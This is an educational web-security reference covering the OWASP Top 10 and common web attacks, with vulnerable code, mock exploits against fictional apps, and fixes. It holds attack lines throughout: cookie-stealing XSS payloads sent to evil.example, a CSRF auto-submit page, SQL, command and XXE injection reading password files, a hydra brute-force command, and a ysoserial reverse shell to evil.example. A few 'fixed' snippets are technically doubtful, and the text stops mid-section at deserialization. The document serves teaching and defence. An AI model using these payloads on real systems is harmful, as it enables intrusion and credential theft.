# Application & Web Security Master Reference

> **Document purpose:** A comprehensive, professional reference covering the software development lifecycle, the OWASP Top 10, web application attack techniques, authentication/session security, API security, security headers, secure coding practices, testing tooling, hardening, mobile security, and a full walkthrough case study. All companies, users, domains, IPs, credentials, and payloads in this document are **fictional** and used purely for education. Do not run any of these attacks against systems you do not own.

---

## Table of Contents

1. [Secure Software Development Lifecycle (SSDLC)](#1-secure-software-development-lifecycle-ssdlc)
2. [OWASP Top 10 (2021)](#2-owasp-top-10-2021)
3. [Web App Attacks Deep Dive](#3-web-app-attacks-deep-dive)
4. [Authentication & Session Security](#4-authentication--session-security)
5. [API Security](#5-api-security)
6. [Web Security Headers](#6-web-security-headers)
7. [Secure Coding Practices by Language](#7-secure-coding-practices-by-language)
8. [Static & Dynamic Testing](#8-static--dynamic-testing)
9. [WAF & Web Server Hardening](#9-waf--web-server-hardening)
10. [Mobile App Security Basics](#10-mobile-app-security-basics)
11. [Developer Security Checklist](#11-developer-security-checklist)
12. [Mock Case Study: "ShopFast" Attack to Secure Rewrite](#12-mock-case-study-shopfast-attack-to-secure-rewrite)

---

## 1. Secure Software Development Lifecycle (SSDLC)

SSDLC integrates security activities into every phase of software development instead of treating security as a bolt-on step at the end. The goal is to **shift security left** — find and fix issues as early and as cheaply as possible.

### 1.1 The Six Phases and Their Security Activities

| Phase | Primary Goal | Security Activities | Key Deliverable |
|-------|--------------|---------------------|-----------------|
| **Requirements** | Define what to build | Threat modeling, security requirements, abuse cases, privacy reviews, security acceptance criteria | Security requirements spec, threat model |
| **Design** | Architecture & data flow | Architecture risk analysis, data flow diagrams, design review against security patterns, attack surface analysis | Design doc with security controls |
| **Develop** | Write code | Secure coding standards, SAST scanning, peer code review, dependency scanning, secret detection | Clean code, SAST/SCA reports |
| **Test** | Verify behavior | DAST, penetration tests, fuzz testing, security regression tests, config validation | Test evidence, pen test report |
| **Deploy** | Ship to production | Infrastructure-as-code review, container scanning, secret rotation, config hardening, release signing | Hardened deployment, deployment gates |
| **Maintain** | Operate & evolve | Patching, vulnerability monitoring, logging & alerting, incident response drills, decommissioning | Patch SLA, incident log, EOL plan |

### 1.2 DevSecOps and CI/CD Security

DevSecOps means security gates are **automated inside the CI/CD pipeline** rather than run manually by a separate team.

```
Developer push
   │
   ▼
┌─────────────────────────────────────────────────────────────┐
│ CI/CD Pipeline  (e.g., GitHub Actions / GitLab CI / Jenkins) │
│                                                             │
│ 1. Commit scanning       — secret detection (trufflehog)    │
│ 2. Dependency scan       — SCA (OWASP Dependency-Check)     │
│ 3. SAST                  — semgrep / bandit / SonarQube     │
│ 4. Unit tests + coverage                                    │
│ 5. Container scan        — trivy / clair                    │
│ 6. Build artifacts       — signed, SBOM generated           │
│ 7. IaC scan              — checkov / tfsec                   │
│ 8. DAST (staging)        — OWASP ZAP                          │
│ 9. Approval gates        — fail build on CRITICAL/HIGH       │
│10. Deploy to prod        — immutable, auditable, rollback    │
└─────────────────────────────────────────────────────────────┘
```

**Core CI/CD security principles:**

- **Fail closed:** If a critical finding is present, the pipeline fails. No bypass, no "documented exception" without sign-off.
- **Immutable artifacts:** Build once, scan, promote the *same* binary to every environment (never rebuild in prod).
- **Short-lived credentials:** CI secrets come from a vault (HashiCorp Vault, AWS Secrets Manager) with rotation; never check secrets into repos.
- **Signed supply chain:** Verify package signatures and pin versions; generate an SBOM (SPDX/CycloneDX) for each release.
- **Least privilege for runners:** CI runners should not hold production credentials.

### 1.3 Threat Modeling with STRIDE

STRIDE is a mnemonic for categories of threats to consider for each element (data flow, process, data store, trust boundary, external entity) in your architecture.

| Letter | Threat | Example | Security Property Violated |
|--------|--------|---------|---------------------------|
| **S** | Spoofing | Attacker logs in as another user | Authentication |
| **T** | Tampering | Attacker modifies an order total in transit | Integrity |
| **R** | Repudiation | User denies placing an order; no audit trail | Non-repudiation |
| **I** | Information Disclosure | Payment data leaked in API response | Confidentiality |
| **D** | Denial of Service | Attacker floods login endpoint, taking app down | Availability |
| **E** | Elevation of Privilege | Regular user gains admin access | Authorization |

#### Worked STRIDE Example: "EduPortal" E-Learning Platform

**Data Flow Diagram element:** `Student Web App -> Login API -> Session Store`

| STRIDE | Threat Scenario | Likelihood | Impact | Mitigation |
|--------|-----------------|-----------|--------|------------|
| Spoofing | Attacker brute-forces student passwords | Med | High | Rate limiting, lockout, MFA |
| Tampering | Student edits `student_id` in session cookie to become admin | Low | High | Server-side sessions, signed tokens |
| Repudiation | Student claims "I didn't submit that quiz" | Med | Med | Immutable audit log of submissions |
| Info Disclosure | Login API returns full user record in error response | Med | High | Minimal error responses, no stack traces |
| DoS | Attacker floods `/api/login` with requests | High | Med | WAF rate limits, exponential backoff |
| Elevation of Privilege | IDOR: student calls `/api/grade/{id}` for another's grade | High | High | Object-level authorization checks |

**Output:** The threat model drives requirements like *"every endpoint that takes an object id MUST verify the caller owns that object."*

### 1.4 Security Requirements

Good security requirements are **testable**. Weak vs. strong examples:

| Weak requirement | Strong (testable) requirement |
|------------------|-------------------------------|
| "Passwords must be secure" | "Passwords must be at least 12 characters, have a max length of 128, and be hashed with Argon2id (memory ≥ 19 MiB, iterations ≥ 2, parallelism 1)." |
| "We should log suspicious stuff" | "All authentication failures and authorization denials must be logged to the central SIEM within 60 seconds, including username, source IP, timestamp, and outcome." |
| "Use encryption" | "All traffic must use TLS 1.2+; HSTS preload with a 1-year max-age; no cipher suites below 128-bit security." |

### 1.5 Code Review for Security

Security code review is distinct from general code review:

- **Automate first:** SAST flags the obvious (injection, hardcoded secrets) before a human looks.
- **Focus on high-risk files:** anything handling auth, payments, file upload, serialization, or admin actions.
- **Look for *flow*, not just syntax:** can attacker-controlled input reach a dangerous sink? (Taint analysis in semgrep does this.)
- **Diff review:** review the security impact of *changes*, not just whole files.
- **Use a checklist:** see [Section 11](#11-developer-security-checklist).

---

## 2. OWASP Top 10 (2021)

The OWASP Top 10 2021 is the most recent release. It lists the ten most critical web application security risks, based on data contributed by the community. Below, each risk is explained with a fictional exploit, its impact, and remediation.

### 2.1 A01:2021 — Broken Access Control

**Explanation:** Access control enforces who can do what. "Broken" access control means an attacker can read, modify, or delete data or functions they should not be allowed to touch. Common flavors: IDOR (Insecure Direct Object References), missing function-level authorization, privilege escalation, CORS misconfiguration.

**Fictional app:** *MediTrack* — a patient records system.

#### Mock Exploit: IDOR on Patient Records

Request by user `alice` (patient) fetching their own record:

```http
GET /api/patient/records/1042
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...   (alice)
```

Vulnerable backend code:

```python
# app.py — VULNERABLE
@app.route("/api/patient/records/<record_id>")
def get_record(record_id):
    # No check that current user owns this record!
    row = db.execute("SELECT * FROM records WHERE id = ?", record_id).fetchone()
    return jsonify(row)
```

Exploit — simply change the ID:

```bash
curl -i "https://meditrack.example/api/patient/records/1043" \
     -H "Cookie: session=ALICE_SESSION"
```

```json
{
  "id": 1043,
  "patient": "bob.smith@example.com",
  "diagnosis": "Mental health consult — referral in progress",
  "ssn_tail": "1234"
}
```

**Impact:** Full horizontal privilege escalation — any patient can read any other patient's records, exposing PHI and violating HIPAA/GDPR.

**Remediation:**

```python
# app.py — FIXED
@app.route("/api/patient/records/<record_id>")
@login_required
def get_record(record_id):
    # Ownership check: the record must belong to the logged-in user
    row = db.execute(
        "SELECT * FROM records WHERE id = ? AND patient_id = ?",
        record_id, g.current_user.id,
    ).fetchone()
    if row is None:
        return jsonify({"error": "not found"}), 404   # never reveal existence
    return jsonify(row)
```

Additional controls: use **opaque, unguessable IDs** (UUIDs instead of sequential ints), enforce a **deny-by-default** policy, and disable web server directory listings. Test IDOR with automated tools that swap IDs across sessions.

### 2.2 A02:2021 — Cryptographic Failures

**Explanation:** Cryptography misused or missing: storing passwords in plaintext, weak hashes (MD5/SHA1), no TLS, weak TLS config, hardcoded keys, predictable IVs, or using encryption where a hash is required.

#### Mock Exploit: Plaintext Password Storage

Vulnerable registration code:

```python
# auth.py — VULNERABLE
def register(username, password):
    db.execute("INSERT INTO users (username, password) VALUES (?, ?)",
               username, password)          # PLAINTEXT — never do this
```

Database leak (via backup exposed on public S3 bucket — another A05 issue):

```
mysql> SELECT username, password FROM users LIMIT 3;
+----------------+--------------+
| username       | password     |
+----------------+--------------+
| alice          | Summer2026!  |
| bob.smith      | password123  |
| admin          | P@ssw0rd     |
+----------------+--------------+
```

**Impact:** One dump = instant account takeover across the app and (via password reuse) across the internet. Cryptographers and lawyers both get angry. GDPR fines up to 4% of global turnover.

**Remediation — hash with a slow, salted KDF:**

```python
# auth.py — FIXED
import argon2

hasher = argon2.PasswordHasher()          # Argon2id — memory-hard KDF

def register(username, password):
    pw_hash = hasher.hash(password)       # auto-generates random salt
    db.execute("INSERT INTO users (username, password_hash) VALUES (?, ?)",
               username, pw_hash)

def verify(username, password):
    row = db.execute("SELECT password_hash FROM users WHERE username=?",
                     username).fetchone()
    if row is None:
        # dummy verify to prevent user-enumeration via timing
        hasher.hash("dummy-password-for-timing-equalization")
        return False
    try:
        return hasher.verify(row["password_hash"], password)
    except argon2.exceptions.VerifyMismatchError:
        return False
```

General cryptography rules:

| Data type | Correct primitive |
|-----------|-------------------|
| Passwords | Argon2id (or scrypt / bcrypt if Argon2 unavailable) |
| Session tokens | CSPRNG random bytes, store hashed server-side |
| Data at rest (DB) | AES-256-GCM, keys in KMS/vault, not in code |
| Data in transit | TLS 1.2+ only, prefer TLS 1.3 |
| Credit cards | Don't store them — outsource to PCI-compliant processor |

### 2.3 A03:2021 — Injection

**Explanation:** Untrusted data is concatenated into a query/command/expression and interpreted as code. Includes SQL, NoSQL, LDAP, OS command, and ORM injection.

#### Mock Exploit: Full SQLi Worked Example

Fictional app: *ShopFast* marketplace. Login form builds a query by string concatenation:

```python
# auth.py — VULNERABLE
@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    user = db.execute(query).fetchone()      # BOOM
```

Attacker submits as username:

```
admin'--
```

Resulting query:

```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
```

Everything after `--` is commented out, so the password check is bypassed → authenticated as admin with no valid password.

**Extending the attack — data exfiltration with `UNION SELECT`:**

```
GET /products?category=' UNION SELECT username,password,email FROM users--
```

```sql
SELECT name, price, description FROM products
WHERE category = '' UNION SELECT username,password,email FROM users--'
```

Response leaks every username + password hash directly in the product listing.

```bash
curl -s "https://shopfast.example/products?category='%20UNION%20SELECT%20username,password_hash,email%20FROM%20users--"
```

**Impact:** Authentication bypass, full data theft, denial of service, RCE on some DBMS (via `xp_cmdshell` on SQL Server / `COPY FROM PROGRAM` on Postgres).

**Remediation — parameterized queries ALWAYS:**

```python
# auth.py — FIXED
@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]
    user = db.execute(
        "SELECT * FROM users WHERE username = ? AND password_hash = ?",
        username, hash_password(password),   # params separated from SQL
    ).fetchone()
```

Layering on top: allowlist input validation (username matches `^[A-Za-z0-9_.-]{3,32}$`), least-privilege DB accounts (app user can't `DROP`), and a WAF rule to flag obvious `' OR 1=1` traffic.

### 2.4 A04:2021 — Insecure Design

**Explanation:** Flaws in *design*, not implementation. Even a perfectly written feature can be insecure if it was designed wrong — e.g., no rate limiting on login, trust boundary violations, "forgot password" that emails the password in plaintext, or business-logic abuse like reusing discount codes infinitely.

#### Mock Exploit: Free-Premium Privilege Logic

Fictional app: *StreamyTV*. Design flaw: the "subscribe" flow lets the client tell the server which plan it wants:

```json
POST /api/subscribe
{
  "plan": "PREMIUM",
  "price": 0.00
}
```

The server blindly applies whatever plan+price the client sends → attacker watches premium content for free.

**Impact:** Revenue loss, business-logic abuse, reputation damage. Design flaws are usually systemic and hard to patch with a single line.

**Remediation:** Apply secure design principles:

- **Threat model** every feature *before* building (see §1.3).
- **Trust boundaries:** never trust the client for anything security-relevant (price, role, ownership).
- **Server-side business rules:** the server derives `price` from a server-side price table, never from the request.
- **Failure modes safe by default** (deny-by-default), and **reuse secure frameworks** rather than inventing crypto or auth.
- Add abuse-case tests to the test suite (e.g., "discount can only be applied once per order").

### 2.5 A05:2021 — Security Misconfiguration

**Explanation:** Default/weak configs left in place: default admin passwords, verbose error messages with stack traces, unnecessary features enabled, directory listing on, open cloud storage buckets, missing security headers, overly permissive CORS.

#### Mock Exploit: Public S3 Bucket + Verbose Errors

A developer runs `aws s3 sync` against a misconfigured bucket:

```
aws s3 sync . s3://shopfast-backups   # bucket ACL is public-read by default
```

```bash
curl -s "https://shopfast-backups.s3.amazonaws.com/db-backup-2026-01-01.sql.gz"
```

Returns the full database backup. Meanwhile, `DEBUG=True` is left on in Django/Flask, so any error shows the full settings, DB credentials, and stack trace.

**Impact:** Immediate full data breach via an easy-to-automate misconfiguration; attackers scan for open buckets constantly.

**Remediation:**

- Turn off directory listings; set `DEBUG=False` in production.
- Enforce IAM/ACL policies (e.g., `BlockPublicAccess` on S3) via IaC (Terraform) so misconfiguration is impossible by default.
- Remove default accounts and change all default passwords.
- Minimal error responses: `{"error":"internal server error"}` with a correlation ID, logs go to a secure aggregator.
- Apply hardened base images / AMI baselines and run config scanning (`checkov`, `tfsec`, `kube-bench`).
- Set all security headers (see [Section 6](#6-web-security-headers)).

### 2.6 A06:2021 — Vulnerable and Outdated Components

**Explanation:** Known-vulnerable libraries, outdated frameworks, or old runtimes with published CVEs that attackers weaponize (often automated). Includes using an EOL (End-of-Life) component like old jQuery, or an abandoned logging library.

#### Mock Exploit: Known CVE in a Dependency

`ShopFast` uses an ancient version of the popular (fictional) `fast-jsonp` library:

```
shopfast/package.json (fragment)
  "dependencies": {
    "fast-jsonp": "^1.0.3"     # CVE-2024-XXXX: prototype pollution via JSONP callback
  }
```

Published exploit:

```js
// attacker_script.js
fetch("https://shopfast.example/api?callback=__proto__[polluted]=1")
```

Attacker chains the prototype pollution into an admin endpoint, escalating to full RCE on the origin server. The attack is fully automated by public scanners — the component is compromised the moment the CVE is disclosed and the app isn't patched.

**Impact:** Depends on the vuln — could be DoS, RCE, or data theft. Because it's a known component, exploit code is public and trivially cheap to use.

**Remediation:**

- **SCA (Software Composition Analysis):** scan every build (see §8.5).
- **Patch policy:** security patches within a defined SLA (e.g., critical: 72h, high: 2 weeks).
- **Pin exact versions** (lockfiles) and verify package integrity (checksums, signatures).
- **Remove unused dependencies** — every dependency is attack surface.
- Track **EOL dates**: no Node < 18, no Python 2, no PHP < 8.1, no unsupported Java.

### 2.7 A07:2021 — Identification and Authentication Failures

**Explanation:** Weak auth: credential stuffing and brute-force not blocked, weak password policy, session IDs leaked in URLs, predictable session IDs, "remember me" stored insecurely, no MFA for privileged accounts.

#### Mock Exploit: Session ID in URL + No Rate Limit

`ShopFast` used to append the session id to links:

```
https://shopfast.example/order/confirm?sessionid=7F3A9C02D14E8821
```

Attacker shares this link on a forum; anyone who clicks it takes over the victim's cart/account because the session token is in the URL and lands in server logs, browser history, and the Referer header.

Separately, `/api/login` has no rate limit, so the attacker runs a credential-stuffing list:

```bash
hydra -l admin -P /tmp/rockyou.txt shopfast.example https-post-form \
      "/api/login:username=^USER^&password=^PASS^:invalid"
```

**Impact:** Account takeover, session hijacking, account-lockout bypass. Legitimate users get no protection.

**Remediation:**

- Session tokens only in `HttpOnly; Secure; SameSite` cookies, never URLs (see §4.1).
- Enforce a sane password policy (§4.6) and **MFA** for all users, mandatory for admins (§4.5).
- **Rate limiting + progressive lockout** on login (e.g., 5 failures → 15-min lockout with exponential backoff).
- Monitor for credential stuffing (login velocity per IP/ASN, new device fingerprints).
- Rotate session IDs on login and privilege change; use secure session timeout.

### 2.8 A08:2021 — Software and Data Integrity Failures

**Explanation:** Code/artifacts/data are not verified for integrity. Includes using unsigned packages or plugins, not verifying that CI/CD outputs haven't been tampered with, deserialization bugs, and not verifying that client-supplied files are what they claim.

#### Mock Exploit: Malicious Dependencies + Signed-Update Bypass

An attacker typosquats a package:

```
Requests            (real, popular)
request             (typosquatted, published by attacker)
```

A developer misspells the import in `requirements.txt`:

```
# requirements.txt (VULNERABLE)
request==2.31.0
```

The attacker's package executes `exfil() -> POST /c2` on install, capturing AWS keys from `~/.aws/credentials` inside CI. The CI/CD pipeline also accepts unsigned build outputs, so a compromised build agent injects a backdoor that ships to production and is auto-deployed.

**Impact:** Supply-chain compromise — malicious code runs with the privileges of whatever pipeline/user installed it. One poisoned dependency reaches every customer.

**Remediation:**

- Verify signatures of third-party artifacts; use **lockfiles with hashes** (e.g., `pip-tools` + `--require-hashes`).
- Never install from typosquat-prone sources; review dependency names.
- **Sign your own builds and releases**; verify before deploy.
- Container image scanning + **digest pinning**.
- Implement **CI/CD integrity**: runners in isolated, ephemeral environments; deploy only signed artifacts.
- Input/output validation on data flows; sanitize file names and verify magic bytes (§3.6).

### 2.9 A09:2021 — Security Logging and Monitoring Failures

**Explanation:** The app doesn't log security events, doesn't monitor them, or logs sensitive data. Attackers go undetected for months (dwell time). GDPR also requires breach detection; you can't respond to what you can't see.

#### Mock Exploit: Silent Attack

Attacker brute-forces `admin` over 3 weeks at 1 attempt/minute across 200 proxies. Nothing is logged, no alerting exists. Eventually succeeds; then:
- Deletes 12,000 customer records with no log entry.
- Exfiltrates the user table.
- Is detected only when customers complain months later.

Forensics reveals: no login-failure logs, no audit trail, and alerts configured to go to a mailbox nobody reads.

**Impact:** Massive breach with no detection, no forensics, no accountability. Regulatory fines for failing to detect/report.

**Remediation:**

- Log at **info level**: successful & failed logins, authorization failures, input validation rejections, admin actions, payment events, file uploads.
- **Never log secrets** (passwords, tokens, PII in cleartext). Redact.
- Centralize logs (SIEM: Splunk/Elastic/Sentinel) with alerts: brute-force, anomalous geo-IP, privilege change.
- Include correlation ID, timestamp, actor, source IP, action, outcome.
- Test detection (purple-team drills) — verify the alert actually fires.
- Retain logs per compliance (e.g., 12 months) and protect them from tampering.

### 2.10 A10:2021 — Server-Side Request Forgery (SSRF)

**Explanation:** The server fetches a URL the attacker controls. The attacker makes the server request internal services (localhost, cloud metadata, internal network), bypassing firewalls because the request originates from a trusted internal host.

#### Mock Exploit: Image Proxy Reads Cloud Metadata

Fictional app: *ImgResize* service. Feature: "give us a URL, we fetch and resize the image."

```python
# img.py — VULNERABLE
@app.route("/fetch")
def fetch_image():
    target = request.args.get("url")
    resp = requests.get(target)          # server makes the request!
    return send_file(BytesIO(resp.content), mimetype="image/jpeg")
```

Attacker request:

```bash
curl "https://imgresize.example/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

Returns AWS IAM temporary credentials:

```json
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "…",
  "Token": "…",
  "Expiration": "2026-08-06T12:00:00Z"
}
```

The attacker now uses these creds to access the entire AWS account. Also exploitable: `http://localhost:5432` (internal Postgres), internal admin UIs, Redis, Kubernetes API server.

**Impact:** Pivot from a public web app to the entire internal network and cloud account (the classic 2021 Capital One-style breach).

**Remediation:**

```python
# img.py — FIXED
from urllib.parse import urlparse
from ipaddress import ip_address

ALLOWED_DOMAINS = {"img.cdn.shopfast.example", "cdn.media.example"}
BLOCKED_NETWORKS = ["127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12",
                    "192.168.0.0/16", "169.254.0.0/16", "0.0.0.0/8",
                    "100.64.0.0/10", "::1", "fc00::/7"]

def validate_url(target):
    parsed = urlparse(target)
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError("domain not allowed")
    # resolve DNS *server-side* and verify IP not in blocked ranges
    for ip in resolve_all(parsed.hostname):
        if ip_address(ip) in [ip_network(n) for n in BLOCKED_NETWORKS]:
            raise ValueError("internal network blocked")
    if parsed.scheme not in ("http", "https"):
        raise ValueError("scheme not allowed")
    return target
```

Defense in depth: block SSRF egress in the network layer (metadata service v2 with IMDS token + `Hop Limit=1`), allowlist destination domains, disable redirects that could point back to internal hosts, and add a WAF rule for `169.254.169.254`.

---

## 3. Web App Attacks Deep Dive

### 3.1 Cross-Site Scripting (XSS)

XSS injects attacker-controlled JavaScript that runs in a victim's browser, in the context of the victim site. Three types:

| Type | Where it executes | Persistence |
|------|-------------------|-------------|
| **Reflected** | In the response to a crafted request (via link) | No — victim must click the malicious link |
| **Stored** | In pages that render server-stored data | Yes — any visitor triggers it |
| **DOM-based** | In the client-side JavaScript, never touching server response | Varies |

#### 3.1.1 Reflected XSS

Vulnerable search page:

```python
# search.py — VULNERABLE
@app.route("/search")
def search():
    q = request.args.get("q", "")
    return f"""
      <html><body>
        <h1>Results for: {q}</h1>     <!-- q rendered without encoding -->
      </body></html>
    """
```

Attack URL (URL-encoded):

```
https://shopfast.example/search?q=%3Cscript%3Efetch('https://evil.example/steal?c='%2Bdocument.cookie)%3C%2Fscript%3E
```

When the victim clicks, `document.cookie` (including the session cookie, unless HttpOnly) is sent to the attacker.

#### 3.1.2 Stored XSS

Vulnerable comment form stores raw HTML:

```python
# comments.py — VULNERABLE
@app.route("/product/<id>/comment", methods=["POST"])
def add_comment(id):
    body = request.form["comment"]           # NOT sanitized, NOT encoded
    db.execute("INSERT INTO comments (product_id, body) VALUES (?,?)", id, body)
```

Attacker posts:

```html
<img src=x onerror="fetch('//evil.example/steal?c='+document.cookie)">
```

Every shopper viewing that product executes the payload — persistent session theft.

#### 3.1.3 DOM-Based XSS

Client-side only; the server never sees the payload:

```javascript
// app.js — VULNERABLE
const params = new URLSearchParams(window.location.search);
const name = params.get('name');
document.getElementById('greeting').innerHTML = 'Hello ' + name;  // sinks into innerHTML
```

Victim visits: `https://shopfast.example/?name=<img src=x onerror=alert(document.cookie)>`

The URL fragment is handled entirely in JS — a WAF scanning the HTTP request won't catch it.

#### Mitigations

1. **Context-aware output encoding** (the primary defense): encode for HTML body, HTML attributes, JS, CSS, URLs respectively.
   - Python/Jinja2: autoescape on (default). `{{ q }}` escapes automatically.
   - Node/EJS: escape with `<%= %>` (not `<%- %>` unescaped).
   - Java/JSP: use `fn:escapeXml` / proper template engine (Thymeleaf auto-escapes).
   - PHP: `htmlspecialchars($s, ENT_QUOTES, 'UTF-8')` on output.
2. **DOM APIs:** use `textContent`, never `innerHTML`, for user data; avoid `eval`, `document.write`, `javascript:` URIs.
3. **CSP (Content-Security-Policy)** as defense-in-depth (§6.2) — blocks inline/remote scripts even if encoding fails.

### 3.2 Cross-Site Request Forgery (CSRF)

CSRF tricks the victim's browser into sending an authenticated request to the target site. The attacker doesn't read the response; they just forge a state-changing request using the victim's existing session cookie (cookies are sent automatically).

#### Full Example

*BankApp* has this endpoint with only a cookie for auth:

```python
# transfer.py — VULNERABLE
@app.route("/transfer", methods=["POST"])
def transfer():
    amt = int(request.form["amount"])
    to  = request.form["to"]
    transfer_money(g.current_user, to, amt)     # CSRF-able
```

Attacker hosts a page:

```html
<!-- evil.html hosted at attacker.example -->
<html>
<body>
  <form action="https://bankapp.example/transfer" method="POST" id="x">
    <input type="hidden" name="amount" value="100000">
    <input type="hidden" name="to" value="attacker">
  </form>
  <script>document.getElementById('x').submit();</script>
</body>
</html>
```

When the logged-in victim visits the attacker's page, the browser auto-submits the form with the victim's `SESSIONID` cookie → silent $100,000 transfer.

#### Anti-CSRF Tokens (Fix)

```python
# BEFORE the form render:
token = secrets.token_urlsafe(32)
redis.setex(f"csrf:{g.current_user.id}", 600, token)

# form includes hidden field:
<input type="hidden" name="csrf_token" value="{{ token }}">

# transfer.py — FIXED
@app.route("/transfer", methods=["POST"])
def transfer():
    expected = redis.get(f"csrf:{g.current_user.id}")
    if not hmac.compare_digest(request.form.get("csrf_token",""), expected):
        abort(403)                       # constant-time comparison
    ...
```

**Defense in depth:**
- **SameSite cookies** (`SameSite=Lax` or `Strict`) — modern browsers block cross-site cookie sending (§4.1).
- Verify `Origin`/`Referer` headers for state-changing requests.
- Don't use GET for state changes; require POST/PUT/DELETE.
- For sensitive actions (password change, transfer), re-authenticate or use a one-time token.

### 3.3 Command Injection

When user input flows into a shell command.

```python
# tools.py — VULNERABLE
import subprocess

@app.route("/ping")
def ping():
    host = request.args.get("host")
    result = subprocess.run(f"ping -c 3 {host}", shell=True,
                            capture_output=True, text=True)
    return f"<pre>{result.stdout}</pre>"
```

Exploit:

```bash
curl "https://shopfast.example/ping?host=127.0.0.1;whoami"
curl "https://shopfast.example/ping?host=127.0.0.1%3Bcat%20/etc/shadow"
```

The server executes `ping -c 3 127.0.0.1;whoami` → RCE as the web server user.

**Fix — never use `shell=True` with untrusted input; pass argv arrays:**

```python
@app.route("/ping")
def ping():
    host = request.args.get("host")
    if not re.fullmatch(r"[\w.\-]+", host):      # strict allowlist
        abort(400)
    result = subprocess.run(["ping", "-c", "3", host],   # argv form, no shell
                            capture_output=True, text=True)
    return f"<pre>{escape(result.stdout)}</pre>"
```

General rule: prefer libraries that don't invoke a shell; if you must, use argument arrays and allowlist validation. Also encode output and never echo raw error output.

### 3.4 XML External Entity (XXE)

XXE exploits XML parsers that resolve external entities, leaking files or enabling SSRF. Even though it moved out of the OWASP Top 10 top list in 2021, it remains critical (it's still listed in A05/A06 adjacent content and many scanners).

#### Exploit Payload

Vulnerable SOAP/REST XML endpoint:

```python
# xml_api.py — VULNERABLE
import xml.etree.ElementTree as ET

@app.route("/api/upload_config", methods=["POST"])
def upload_config():
    root = ET.fromstring(request.data)   # libxml2 defaults allow external entities
    ...
```

Attacker POSTs:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<config>
  <item>&xxe;</item>
</config>
```

The parser substitutes `&xxe;` with the contents of `/etc/passwd`, which the app echoes back in a response field.

To reach internal networks (SSRF):

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

#### Fix

```python
from defusedxml import ElementTree as ET   # defusedxml disables entities by default
```

Or disable DTD processing explicitly:

```python
parser = ET.XMLParser()
parser.entity.clear()          # or set custom resolver returning empty
```

Language-specific hardening:
- Python: `defusedxml` (always).
- Java: `DocumentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`.
- PHP: `libxml_disable_entity_loader(true)`.
- .NET: use `XmlReader` with `DtdProcessing = Prohibit`.

Also disable external general entities and reject any `DOCTYPE`.

### 3.5 File Upload Vulnerabilities

Uploaded files can be a trojan horse for RCE.

#### Bypass Techniques

| Technique | Detail |
|-----------|--------|
| Extension bypass | Upload `shell.php` → rename to `shell.php.jpg` or `shell.pHp` or `shell.php%00.jpg` (old null-byte) |
| MIME spoofing | Client sends `Content-Type: image/png` but body is PHP |
| Magic-byte spoofing | Prepend `GIF89a` to a PHP payload — server checks only magic bytes |
| Polyglot files | File valid as both image and script |
| Double extension | `shell.php.jpg` — config-dependent handling |
| .htaccess / web.config | Upload an `.htaccess` that enables PHP execution in the uploads dir |
| Path traversal in name | `../../shell.php` writes outside the uploads dir |

#### Secure Upload Implementation

```python
# upload.py — FIXED
import magic, uuid, os

ALLOWED_EXT = {"jpg", "png", "gif", "webp", "pdf"}
MAX_SIZE = 5 * 1024 * 1024
UPLOAD_DIR = "/var/www/uploads"            # OUTSIDE the web root!

def handle_upload(file_storage):
    if file_storage.filename.count(".") > 1:
        abort(400, "filename rejected")
    ext = os.path.splitext(file_storage.filename)[1].lower().lstrip(".")
    if ext not in ALLOWED_EXT:
        abort(400, "extension not allowed")

    data = file_storage.read(MAX_SIZE + 1)
    if len(data) > MAX_SIZE:
        abort(413, "too large")

    detected = magic.from_buffer(data, mime=True)     # server-side magic bytes
    expected = {"jpg": "image/jpeg", "png": "image/png", "gif": "image/gif"}
    if detected != expected.get(ext):
        abort(400, "content mismatch")

    # never trust the client filename; generate our own
    new_name = uuid.uuid4().hex + "." + ext
    path = os.path.join(UPLOAD_DIR, new_name)
    with open(path, "wb") as f:
        f.write(data)
    return f"/media/{new_name}"                        # served via safe route
```

Additional hardening: serve uploads from a separate domain/CDN with no script execution, store on object storage (S3) with public-read but server-set Content-Disposition, scan files with AV, re-encode images server-side (strip metadata + embedded payloads), and reject any request where the file content contains PHP/HTML tags for non-HTML types.

### 3.6 Path Traversal

Attacker uses `../` sequences to escape the intended directory.

```python
# download.py — VULNERABLE
@app.route("/files/<name>")
def download(name):
    path = os.path.join("/var/www/user_files", name)    # no validation
    return send_file(path)
```

Exploit:

```bash
curl "https://shopfast.example/files/..%2f..%2f..%2f..%2fetc%2fpasswd"
curl "https://shopfast.example/files/....//....//etc/passwd"    # filter bypass
curl "https://shopfast.example/files/%252e%252e%252fetc%252fpasswd"  # double-encoding
```

**Fix — canonicalize and verify the resolved path stays within the base:**

```python
import os

BASE = os.path.realpath("/var/www/user_files")

def safe_path(name):
    target = os.path.realpath(os.path.join(BASE, name))
    if target != BASE and not target.startswith(BASE + os.sep):
        abort(400)
    return target
```

Also: use opaque stored filenames (like the UUID approach in §3.5) so users never control the file path at all.

### 3.7 Insecure Deserialization

Deserializing untrusted data can lead to RCE, DoS, or object-injection. Java's `ObjectInputStream`, Python's `pickle`, PHP's `unserialize`, and .NET `BinaryFormatter` are notorious.

#### ysoserial-Style Explanation

`ysoserial` is a public gadget-chain generator for Java deserialization. It composes existing library classes (gadgets) so that *deserializing* a crafted payload invokes dangerous methods (e.g., `Runtime.exec`) without any app code being obviously vulnerable.

Fictional app: *CartSvc* reads its cart from a `base64`-encoded Java-serialized object stored client-side:

```java
// CartSvc.java — VULNERABLE
byte[] data = Base64.getDecoder().decode(cartParam);
Object cart = new ObjectInputStream(new ByteArrayInputStream(data)).readObject();
```

Attacker runs:

```bash
java -jar ysoserial.jar CommonsCollections1 'nc -e /bin/sh evil.example 4444' > payload.bin
base64 payload.bin | xargs -I{} curl -b "cart={}" https://cart.example/checkout
```

